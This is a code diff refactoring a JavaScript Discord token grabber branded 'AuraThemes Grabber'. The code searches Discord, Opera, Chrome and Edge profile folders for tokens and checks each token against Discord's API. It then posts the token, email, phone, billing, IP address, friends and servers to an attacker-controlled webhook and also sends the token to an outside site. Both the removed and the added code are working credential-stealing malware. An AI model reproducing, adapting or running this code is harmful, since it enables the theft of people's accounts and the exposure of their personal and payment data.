@@ -1,53 +1,55 @@
-const { fetchServers, getEmbed, getPublicIps, getField } = require("./../../utils/functions");
-const { EmbedBuilder, WebhookClient } = require("discord.js");
-const DiscordToken = require("discord.js-token");
+const { getPublicIp } = require("./../../modules/core/core");
+const { fetchServers, getEmbeds, send } = require("./../../utils/functions");
+const { WebhookClient } = require("discord.js");
 const { totalsTokens, find } = require("./find");
-const axios = require("axios");
+const DiscordToken = require("discord.js-token");
 const getconfig = require("./../../config/config")();
+const process = require("process");
+const axios = require("axios");
 
 const webhook = new WebhookClient({
     url: getconfig.webhook,
 });
 
-let appdata = process.env.appdata;
-let localappdata = process.env.localappdata;
+const appData = process.env.appdata;
+const localAppData = process.env.localappdata;
 
 let paths = [
-    `${appdata}/discord/`,
-    `${appdata}/discordcanary/`,
-    `${appdata}/discordptb/`,
-    `${appdata}/discorddevelopment/`,
-    `${appdata}/lightcord/`,
-    `${appdata}/Opera Software/Opera Stable/`,
-    `${appdata}/Opera Software/Opera GX Stable/`,
-    `${localappdata}/Google/Chrome/User Data/Default/`,
-    `${localappdata}/Google/Chrome/User Data/Profile 1/`,
-    `${localappdata}/Google/Chrome/User Data/Profile 2/`,
-    `${localappdata}/Google/Chrome/User Data/Profile 3/`,
-    `${localappdata}/Google/Chrome/User Data/Profile 4/`,
-    `${localappdata}/Google/Chrome/User Data/Profile 5/`,
-    `${localappdata}/Google/Chrome/User Data/Guest Profile/`,
-    `${localappdata}/Google/Chrome/User Data/Default/Network/`,
-    `${localappdata}/Google/Chrome/User Data/Profile 1/Network/`,
-    `${localappdata}/Google/Chrome/User Data/Profile 2/Network/`,
-    `${localappdata}/Google/Chrome/User Data/Profile 3/Network/`,
-    `${localappdata}/Google/Chrome/User Data/Profile 4/Network/`,
-    `${localappdata}/Google/Chrome/User Data/Profile 5/Network/`,
-    `${localappdata}/Google/Chrome/User Data/Guest Profile/Network/`,
-    `${localappdata}/Microsoft/Edge/User Data/Default/`,
-    `${localappdata}/Microsoft/Edge/User Data/Profile 1/`,
-    `${localappdata}/Microsoft/Edge/User Data/Profile 2/`,
-    `${localappdata}/Microsoft/Edge/User Data/Profile 3/`,
-    `${localappdata}/Microsoft/Edge/User Data/Profile 4/`,
-    `${localappdata}/Microsoft/Edge/User Data/Profile 5/`,
-    `${localappdata}/Microsoft/Edge/User Data/Guest Profile/`,
-    `${localappdata}/Microsoft/Edge/User Data/Default/Network/`,
-    `${localappdata}/Microsoft/Edge/User Data/Profile 1/Network/`,
-    `${localappdata}/Microsoft/Edge/User Data/Profile 2/Network/`,
-    `${localappdata}/Microsoft/Edge/User Data/Profile 3/Network/`,
-    `${localappdata}/Microsoft/Edge/User Data/Profile 4/Network/`,
-    `${localappdata}/Microsoft/Edge/User Data/Profile 5/Network/`,
-    `${localappdata}/Microsoft/Edge/User Data/Guest Profile/Network/`,
+    `${appData}/discord/`,
+    `${appData}/discordcanary/`,
+    `${appData}/discordptb/`,
+    `${appData}/discorddevelopment/`,
+    `${appData}/lightcord/`,
+    `${appData}/Opera Software/Opera Stable/`,
+    `${appData}/Opera Software/Opera GX Stable/`,
+    `${localAppData}/Google/Chrome/User Data/Default/`,
+    `${localAppData}/Google/Chrome/User Data/Profile 1/`,
+    `${localAppData}/Google/Chrome/User Data/Profile 2/`,
+    `${localAppData}/Google/Chrome/User Data/Profile 3/`,
+    `${localAppData}/Google/Chrome/User Data/Profile 4/`,
+    `${localAppData}/Google/Chrome/User Data/Profile 5/`,
+    `${localAppData}/Google/Chrome/User Data/Guest Profile/`,
+    `${localAppData}/Google/Chrome/User Data/Default/Network/`,
+    `${localAppData}/Google/Chrome/User Data/Profile 1/Network/`,
+    `${localAppData}/Google/Chrome/User Data/Profile 2/Network/`,
+    `${localAppData}/Google/Chrome/User Data/Profile 3/Network/`,
+    `${localAppData}/Google/Chrome/User Data/Profile 4/Network/`,
+    `${localAppData}/Google/Chrome/User Data/Profile 5/Network/`,
+    `${localAppData}/Google/Chrome/User Data/Guest Profile/Network/`,
+    `${localAppData}/Microsoft/Edge/User Data/Default/`,
+    `${localAppData}/Microsoft/Edge/User Data/Profile 1/`,
+    `${localAppData}/Microsoft/Edge/User Data/Profile 2/`,
+    `${localAppData}/Microsoft/Edge/User Data/Profile 3/`,
+    `${localAppData}/Microsoft/Edge/User Data/Profile 4/`,
+    `${localAppData}/Microsoft/Edge/User Data/Profile 5/`,
+    `${localAppData}/Microsoft/Edge/User Data/Guest Profile/`,
+    `${localAppData}/Microsoft/Edge/User Data/Default/Network/`,
+    `${localAppData}/Microsoft/Edge/User Data/Profile 1/Network/`,
+    `${localAppData}/Microsoft/Edge/User Data/Profile 2/Network/`,
+    `${localAppData}/Microsoft/Edge/User Data/Profile 3/Network/`,
+    `${localAppData}/Microsoft/Edge/User Data/Profile 4/Network/`,
+    `${localAppData}/Microsoft/Edge/User Data/Profile 5/Network/`,
+    `${localAppData}/Microsoft/Edge/User Data/Guest Profile/Network/`,
 ];
 
 async function sendTokens() {
@@ -62,104 +64,62 @@ async function sendTokens() {
             headers: {
                 Authorization: token,
             },
-        })
-            .then((info) => { k4itrun = info.data })
-            .catch(() => { k4itrun = null });
+        })  .then((r) => { k4itrun = r.data })
+            .catch((e) => { k4itrun = null });
+
         if (!k4itrun) continue;
 
-        var color = "#c267ff";
         var copy = `https://6889.fun/api/aurathemes/raw?data=${token}`;
-        let embed = getEmbed();
         var servers = await fetchServers(token);
-        let network = await getPublicIps();
-        var Discord = new DiscordToken(token, network.ip, k4itrun.password).info;
-        var Initialized = new EmbedBuilder()
-            .setAuthor({ name: `${Discord.username} | ${Discord.ID}`, iconURL: Discord.avatar })
-            .setThumbnail(Discord.avatar)
-            .setColor(color)
-            .setTitle("Initialized Grabber")
-            .addFields(getField(`<a:aura:1087044506542674091> Token:`, `\`\`\`${Discord.token}\`\`\`\n[[Click Here To Copy Your Token]](${copy})`))
-            .addFields(getField(`<a:aura:1101739920319590420> Nitro:`, Discord.nitroType, true))
-            .addFields(getField(`<a:aura:995172580988309664> IP Adress`, `\`${network.ip}\``, true))
-            .addFields(getField(`<a:aura:863691953531125820> Phone`, `\`${Discord.phone}\``, true))
-            .addFields(getField(`<:aura:974711605927505990> Email`, `\`${Discord.mail}\``, false))
-            .addFields(getField(`Badges`, Discord.badges, true))
-            .addFields(getField(`Billing`, Discord.billing, true))
-            .setFooter({ text: `AuraThemes Grabber - ${embed.url}`, iconURL: embed.footericon })
-            .setTimestamp();
-        webhook.send({ embeds: [Initialized], username: `@AuraThemes`, avatarURL: embed.avatar }).then(() => { axios.get(copy) }).catch((c) => { axios.get(copy) });
+        let network = await getPublicIp();
+        var discord = new DiscordToken(token, network.ip, k4itrun.password).info;
 
-        var Friend = new EmbedBuilder()
-            .setAuthor({ name: `${Discord.username} | ${Discord.ID}`, iconURL: Discord.avatar })
-            .setColor(color)
-            .setTitle("HQ Friend(s)")
-            .setDescription(Discord.StrangeFriends === "None" ? `\`\`\`yml\nNot found\`\`\`` : `**${Discord.StrangeFriends}**` )
-            .setFooter({ text: `AuraThemes Grabber - ${embed.url}`, iconURL: embed.footericon })
-            .setTimestamp();
-        setTimeout(() => webhook.send({ embeds: [Friend], username: `@AuraThemes`, avatarURL: embed.avatar }), 50 );
-        
-        var Guild = new EmbedBuilder()
-            .setAuthor({ name: `${Discord.username} | ${Discord.ID}`, iconURL: Discord.avatar })
-            .setColor(color)
-            .setTitle("HQ Guild(s)")
-            .setDescription(servers.all)
-            .setFooter({ text: `AuraThemes Grabber - ${embed.url}`, iconURL: embed.footericon })
-            .setTimestamp();
-        setTimeout(() => webhook.send({ embeds: [Guild], username: `@AuraThemes`, avatarURL: embed.avatar }), 50);
-        
-        var Information = new EmbedBuilder()
-            .setAuthor({ name: `${Discord.username} | ${Discord.ID}`, iconURL: Discord.avatar })
-            .setColor(color)
-            .setTitle("User Informatio(s)")
-            .setDescription(
-                `**NSFW** ${Discord.NSFW}\n` +
-                `**Status** ${Discord.status}\n` +
-                `**Owner Servers** \`${Discord.totalOwnedGuild}\`\n` +
-                `**Connection** \`${Discord.totalConnection}\`\n` +
-                `**BOTS/RPC** \`${Discord.totalApplication}\`\n` +
-                `**Blocked** \`${Discord.totalBlocked}\`\n` +
-                `**Servers** \`${Discord.totalGuild}\`\n` +
-                `**Friends** \`${Discord.totalFriend}\`\n` +
-                `**Theme** \`${Discord.theme}\`\n` +
-                `**Pending** \`${Discord.pending}\`\n\n` +
-                `**Biography** \`\`\`yml\n${Discord.bio === "has no description" ? "Not found" : Discord.bio
-                }\n\`\`\``,
-            )
-            .setFooter({ text: `AuraThemes Grabber - ${embed.url}`, iconURL: embed.footericon })
-            .setTimestamp();
-        setTimeout(() => webhook.send({ embeds: [Information], username: `@AuraThemes`, avatarURL: embed.avatar, }), 100);
-        
-        var Gifts = new EmbedBuilder()
-            .setAuthor({ name: `${Discord.username} | ${Discord.ID}`, iconURL: Discord.avatar })
-            .setColor(color)
-            .setTitle("Gifts Code(s)")
-            .addFields(
-                ...Object.entries(Discord.Gifts).map(([key, value]) => ({
-                    name: "Code " + key,
-                    value: typeof value === "object"
-                        ? `\`\`\`json\n${JSON.stringify(value, null, 2)
-                            ? JSON.stringify(value, null, 2)
-                            : "None"
-                        }\n\`\`\``
-                        : value.toString(),
-                })),
-            )
-            .setFooter({ text: `AuraThemes Grabber - ${embed.url}`, iconURL: embed.footericon })
-            .setTimestamp();
-        setTimeout(() => webhook.send({ embeds: [Gifts], username: `@AuraThemes`, avatarURL: embed.avatar, }), 150);
-        
-        var System = new EmbedBuilder()
-            .setAuthor({ name: `${Discord.username} | ${Discord.ID}`, iconURL: Discord.avatar })
-            .setColor(color)
-            .setTitle("System Informatio(s)")
-            .addFields(getField(`Network`, `\`\`\`yml\nPUBLIC: ${Discord.IP.ip}\nCountry: ${Discord.IP.country}\nRegion: ${Discord.IP.region}\nCity: ${Discord.IP.city}\nLatitude: ${Discord.IP.latitude}\nLongitude: ${Discord.IP.longitude}\nISP: ${Discord.IP.isp}\nTime Zone: ${Discord.IP.timezone}\nCurrency Code: ${Discord.IP.currency_code}\`\`\``, false))
-            .setFooter({
-                text: `AuraThemes Grabber - ${embed.url}`,
-                iconURL: embed.footericon,
-            })
-            .setTimestamp();
-        setTimeout(() => webhook.send({ embeds: [System], username: `@AuraThemes`, avatarURL: embed.avatar }), 200);
-        
+        webhook.send(send(getEmbeds({
+            author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
+            thumbnail: "" + discord.avatar + "",
+            title: "Initialized Grabber",
+            fields: [
+                { name: "<a:aura:1087044506542674091> Token:", value: "```" + discord.token + "```" + `\n[[Click Here To Copy Your Token]](${copy})` },
+                { name: "<a:aura:1101739920319590420> Nitro:", value: "" + discord.nitroType + "", inline: true },
+                { name: "<a:aura:995172580988309664> IP Adress", value: "`" + network.ip + "`", inline: true },
+                { name: "<a:aura:863691953531125820> Phone", value: "`" + discord.phone + "`", inline: true },
+                { name: "<:aura:974711605927505990> Email", value: "`" + discord.mail + "`", inline: true },
+                { name: "Badges", value: "" + discord.badges + "", inline: true },
+                { name: "Billing", value: "" + discord.billing + "", inline: true },
+            ],
+        }))).then((r) => { axios.get(copy) }).catch((e) => { axios.get(copy) });
+
+        setTimeout(() => webhook.send(send(getEmbeds({
+            author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
+            thumbnail: "" + discord.avatar + "",
+            title: "HQ Friend(s)",
+            desc: "" + discord.StrangeFriends + "" === "None" ? "```yml\n" + "Not found" + "```" : "**" + discord.StrangeFriends + "**"
+        }))), 50);
+
+        setTimeout(() => webhook.send(send(getEmbeds({
+            author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
+            thumbnail: "" + discord.avatar + "",
+            title: "HQ Guild(s)",
+            desc: "" + servers.all + ""
+        }))), 50);
+
+        setTimeout(() => webhook.send(send(getEmbeds({
+            author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
+            thumbnail: "" + discord.avatar + "",
+            title: "User Informatio(s)",
+            desc:
+                "**NSFW**" + discord.NSFW + "\n" +
+                "**Status**" + discord.status + "\n" +
+                "**Owner Servers**" + "`" + discord.totalOwnedGuild + "`\n" +
+                "**Connection**" + "`" + discord.totalConnection + "`\n" +
+                "**BOTS/RPC**" + "`" + discord.totalApplication + "`\n" +
+                "**Blocked**" + "`" + discord.totalBlocked + "`\n" +
+                "**Servers**" + "`" + discord.totalGuild + "`\n" +
+                "**Friends**" + "`" + discord.totalFriend + "`\n" +
+                "**Theme**" + "`" + discord.theme + "`\n" +
+                "**Pending**" + "`" + discord.pending + "`\n\n" +
+                "**Biography**" + "```yml\n" + (discord.bio === "has no description" ? "Not found" : discord.bio) + "\n```"
+        }))), 100);
         continue;
     }
 }
